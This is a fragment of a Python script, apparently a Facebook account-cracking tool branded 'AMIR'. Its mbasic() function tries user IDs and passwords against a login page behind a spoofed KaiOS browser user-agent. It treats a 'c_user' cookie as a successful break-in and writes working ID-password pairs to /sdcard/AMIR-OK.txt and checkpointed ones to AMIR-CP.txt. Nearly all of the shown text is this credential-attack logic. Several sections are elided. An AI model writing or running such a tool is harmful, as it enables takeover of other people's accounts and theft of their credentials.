...
def Random():
	...
	print('\033[1;37m(!)══════════════════════════════════════════')
	print('[•] OK IDS SAVE : /sdcard/AMIR-OK.txt\n[•] CP IDS SAVE : /sdcard/AMIR-CP.txt')
	input('[•] Press Enter To Back Menu ');os.system('python AMIR.py')
def mbasic(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\r\033[1;32m[AMIR-OK] '+cid+' | '+ps)
				cek_apk(session,coki)
				open('/sdcard/AMIR-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				Red = '\x1b[38;5;208m'
				print(f'\r{Red}[AMIR-CP] '+cid+' | '+ps+'\033[1;97m')
				open('/sdcard/AMIR-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
			else:
				continue
		loop+=1
		sys.stdout.write('\r%s[MR•AMIR] %s|OK:-%s'%(bi,loop,len(oks))),
		sys.stdout.flush()
	except:
		pass	
Main()
